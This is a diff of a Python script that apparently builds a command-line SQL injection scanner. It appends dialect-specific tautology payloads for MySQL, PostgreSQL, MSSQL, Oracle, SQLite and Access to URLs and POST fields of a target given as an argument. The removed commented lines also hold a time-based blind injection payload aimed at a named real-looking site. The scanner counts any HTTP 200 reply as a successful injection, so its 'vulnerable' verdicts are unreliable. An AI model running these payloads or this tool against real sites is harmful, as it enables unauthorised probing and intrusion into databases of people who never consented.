@@ -1,69 +1,72 @@
-# import requests
+import mechanize
+import requests
+from faker import Faker
+import argparse
 
+#argumets defined for script to work as it is designed
+parser = argparse.ArgumentParser() #Initializing argument parser to accept atguments
+#Defining arguments
+parser.add_argument("--url", help="Url to send the request.", type=str, required=True)
+parser.add_argument("--method", help="Method for sending the request.", default="GET", type=str)
+parser.add_argument("--data", help="Data in case a post request. Ex. name=value,name2=value2", type=str,)
+args = parser.parse_args() #Parsing arguments
+method = str.upper(args.method) #get the method provided and make it upper case
 
-# find_dbms_payloads = {
-#     "mysql": "'); select connection_id(); --",
-#     "postgresql": "'); select pg_client_encoding(); --",
-#     "mssql": "'); select @@CONNECTIONS; --",
-#     "oracle": "'); select RAWTOHEX('AB')=RAWTOHEX('AB'); --",
-#     "sqlite": "'); select sqlite_version(); --",
-#     "msacess": "'); select last_insert_rowid()>1; --"
-# }
+#Payloads to find the dbms
+#Each one works only on specified dialect
+find_dbms_payloads = {
+    "mysql": "' or connection_id() = connection_id(); --",
+    "postgresql": "' or pg_client_encoding() = pg_client_encoding(); --",
+    "mssql": "' or @@CONNECTIONS = @@CONNECTIONS; --",
+    "oracle": "' or RAWTOHEX('AB')=RAWTOHEX('AB'); --",
+    "sqlite": "' or sqlite_version() = sqlite_version(); --",
+    "msacess": "' or last_insert_rowid()>1; --"
+}
 
-# method = input("Do you want to make a GET or POST request? (1.GET(default) or 2.POST): ")
+# POST request
+if(method == "POST"):
+    #Check for data params
+    if(not args.data):
+        print("When POST method is specified you must pass the data argument")
+    else: 
+        dataArgs = args.data.split(",")
+        postParams = {}
+        for arg in dataArgs:
+            arg = arg.split("=");
+            postParams[arg[0]] = arg[1]
+        requestList = {}
+        for param in postParams:
+            for payload in find_dbms_payloads:
+                data = postParams.copy()
+                data[param] = data[param] + find_dbms_payloads[payload]
+                resp = requests.post(args.url, data)
+                if(resp.status_code == 200):
+                    print("Argumet " + param + " seems to be injectable.")
+                    requestList[payload] = resp
 
-# if(method != "2"):
-#     method = "GET"
-# else: 
-#     method = "POST"
-
-# print("You chose " + method + " method.")
-
-# get_url = True
-# while(get_url):
-#     try: 
-#         #Get the url of the target form input
-#         url = input("Enter target url: ")
-#         #Get the http part of url
-#         subUrl = url[:4]
-
-#         #Test if is http
-#         if(not ("http" in subUrl)):
-#             #If not append http://
-#             url = "http://" + url
-
-#         #Test the request
-#         if(method == "GET"):
-#             result  = requests.get(url)
-#             #If got invalid response change the http to https
-#             if(result.status_code != 200):
-#                 url = "https://" + url[7:]
-#                 result = requests.get(url)
-
-#             if(result.status_code != 200):
-#                 print("Could not connect to the providen url. Try again.")
-#             else:
-#                 print("Connection to url made successfully")
-#                 get_url = False
-#         else:
-#             get_url = False        
-#     except: 
-#         print("Could not connect to the providen url. Try again.")
-    
-# if(method == "GET"):
-#     print("GET")
-# else:
-#     param = input("Type the param you wish to test: ")
-#     for payload in find_dbms_payloads:
-#         print(find_dbms_payloads[payload])
-#         data = {"email": find_dbms_payloads[payload]}
-#         result = requests.post(url, data);
-#         print(result)
-
-
-# # data = {'userEmail':"usman@cyberpersons.com",'status':'1','password':"cyberpersons'",'findUs':'IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*\'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\'|"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/'}
-# # targetURL = 'http://check.cyberpersons.com/ProjectDev/register.php'
-# # result = requests.post(targetURL,data)
- 
-# # print result.elapsed.total_seconds()
-# # print result.text
+        if(len(requestList) > 0):
+            print("Target is vulnerable.")
+            for response in requestList:
+                resp = requestList[response]
+                print("The dialect of the target is " + response)
+        else:
+            print("Target seems secure.")
+#GET request
+elif(method == "GET"):
+    requestList = {}
+    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
+    for payload in find_dbms_payloads:
+        url = args.url + find_dbms_payloads[payload]
+        resp = requests.get(url)
+        if(resp.status_code == 200):
+            print("Url seems injectable.")
+            requestList[payload] = resp
+    if(len(requestList) > 0):
+        print("Target is vulnerable.")
+        for response in requestList:
+            resp = requestList[response]
+            print("The dialect of the target is " + response)
+    else:
+        print("Target seems secure.")
+else:
+    print("Method got incorrect value")
